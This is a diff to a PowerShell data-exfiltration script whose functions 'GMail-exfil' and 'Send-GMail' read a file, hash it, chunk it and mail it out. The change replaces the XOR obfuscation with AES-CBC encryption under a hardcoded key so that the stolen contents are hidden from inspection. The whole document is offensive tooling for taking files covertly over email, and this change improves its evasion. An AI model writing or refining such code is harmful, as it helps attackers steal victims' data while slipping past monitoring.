@@ -6,8 +6,8 @@ function GMail-exfil
     $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
     $hash = $hash -replace '-','';
     $filename = Split-Path $file -leaf
+    $bytes = AES $bytes
     $string = [System.BitConverter]::ToString($bytes);
-    $string = $string -replace '-','';
     $len = $string.Length;
     #$split = Get-Random -minimum 1 -maximum 250;
     $split = 3000
@@ -36,7 +36,6 @@ function GMail-exfil
 
 function Send-GMail {
     param ([string] $data)
-    $data = Xor $data;
     $data = Base64 $data;   
     $From = ""
     $To = ""
@@ -57,17 +56,28 @@ function Base64 {
     return [Convert]::ToBase64String($Bytes)    
 }
 
-function Xor {
-    param ([string] $data)  
-    $enc = [system.Text.Encoding]::UTF8
-    $bytes = $enc.GetBytes($data)
+function AES {
+    param ([byte[]] $data)
+
     $key = "THISISACRAZYKEY"
-    for($i=0; $i -lt $bytes.count ; $i++)
-    {
-        $bytes[$i] = $bytes[$i] -bxor $key[$i%$key.Length]
-    }
-    return [System.Text.Encoding]::ASCII.GetString($bytes)
-}
+    $sha256 = New-Object System.Security.Cryptography.SHA256Managed
+
+    $AES = New-Object System.Security.Cryptography.AesManaged
+    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $AES.BlockSize = 128
+    $AES.KeySize = 256
+    $AES.Padding = "PKCS7"
+    $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))
+
+    $IV = new-object "System.Byte[]" 16
+    $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
+    $RNGCrypto.GetBytes($IV)
+    $AES.IV = $IV
+
+    $Encryptor = $AES.CreateEncryptor()
+
+    return ($IV + $encryptor.TransformFinalBlock($data, 0, $data.Length))
+};
 
 function Convert-ToCHexString 
 {
